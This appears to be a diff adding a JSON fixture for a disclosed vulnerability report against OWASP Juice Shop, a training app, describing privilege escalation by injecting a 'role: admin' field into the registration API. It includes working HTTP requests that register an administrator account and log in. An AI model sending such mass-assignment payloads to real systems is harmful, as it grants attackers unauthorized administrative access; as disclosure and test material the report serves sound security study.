@@ -1,0 +1,21 @@
+{
+  "id": 900109,
+  "title": "Privilege escalation via manipulating user role in registration API",
+  "severity_rating": "critical",
+  "state": "disclosed",
+  "substate": "resolved",
+  "visibility": "full",
+  "disclosed_at": "2025-01-30T10:00:00Z",
+  "team": {
+    "handle": "owasp-juice-shop",
+    "name": "OWASP Juice Shop"
+  },
+  "reporter": {
+    "username": "resurface_researcher"
+  },
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "vulnerability_information": "## Summary\nThe user registration API endpoint in Juice Shop accepts a `role` field in the request body that is not properly validated. By adding `\"role\": \"admin\"` to the registration request, an attacker can create a new account with administrator privileges.\n\n## Steps to Reproduce\n1. Intercept the registration request or craft the following API call:\n```\nPOST http://localhost:3333/api/Users\nContent-Type: application/json\n\n{\n  \"email\": \"attacker@evil.com\",\n  \"password\": \"attackerpass123\",\n  \"passwordRepeat\": \"attackerpass123\",\n  \"role\": \"admin\",\n  \"securityQuestion\": {\n    \"id\": 1,\n    \"question\": \"Your eldest siblings middle name?\"\n  },\n  \"securityAnswer\": \"test\"\n}\n```\n2. The server creates the account and accepts the role field\n3. Log in with the new credentials:\n```\nPOST http://localhost:3333/rest/user/login\nContent-Type: application/json\n\n{\"email\": \"attacker@evil.com\", \"password\": \"attackerpass123\"}\n```\n4. The returned token has admin privileges\n5. Navigate to http://localhost:3333/#/administration to confirm admin access\n\n## Impact\nCritical — Any unauthenticated user can register an admin account. This completely bypasses the authorization model and grants full administrative access to the application.\n\n## Expected Behavior\nThe registration endpoint should ignore or reject the `role` field. All new accounts should be created with the default `customer` role.\n\n## Actual Behavior\nThe API blindly accepts and stores the `role` field from user input, allowing privilege escalation during registration."
+}
